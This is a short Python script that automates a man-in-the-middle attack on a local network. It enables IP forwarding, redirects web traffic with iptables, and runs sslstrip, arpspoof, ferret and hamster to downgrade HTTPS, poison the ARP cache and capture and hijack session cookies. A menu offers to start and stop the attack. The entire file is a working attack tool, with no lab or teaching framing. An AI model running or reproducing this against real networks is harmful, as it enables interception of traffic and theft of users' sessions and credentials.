import eznhlib

bash_cmd = eznhlib.bash_cmd
get_gw = eznhlib.get_gw
readUserInput = eznhlib.readUserInput
popen_background = eznhlib.popen_background


def start_attack():
    gw_file = "userinput_gateway.txt"
    iface_file = "userinput_interface.txt"
    iface = readUserInput(iface_file)
    gw = readUserInput(gw_file)
    commands = """echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
    sslstrip -f -a -k -l 1000 -w /root/sslstrip.txt &
    arpspoof -i {0} {1} &
    ferret -i {0} &
    hamster &
    """.format(
        str(iface),
        str(gw)
    )
    bash_cmd(commands)
    return

def stop_attack():
    commands = """pkill sslstrip
    pkill arpspoof
    pkill ferret
    pkill hamster
    iptables --policy INPUT ACCEPT
    iptables --policy FORWARD ACCEPT
    iptables --policy OUTPUT ACCEPT
    iptables -t nat -F"""
    bash_cmd(commands)
    return

def main():
    print """
\t1: START ATTACK, sslstrip + arpspoof + ferret + hamster
\t2: STOP ATTACK
    """

    choice = int(raw_input("Enter a OPTION: "))

    if choice == 1:
        start_attack()
    elif choice == 2:
        stop_attack()
    else:
        print "You have entered a incorrect option"
        main()
    return
main()
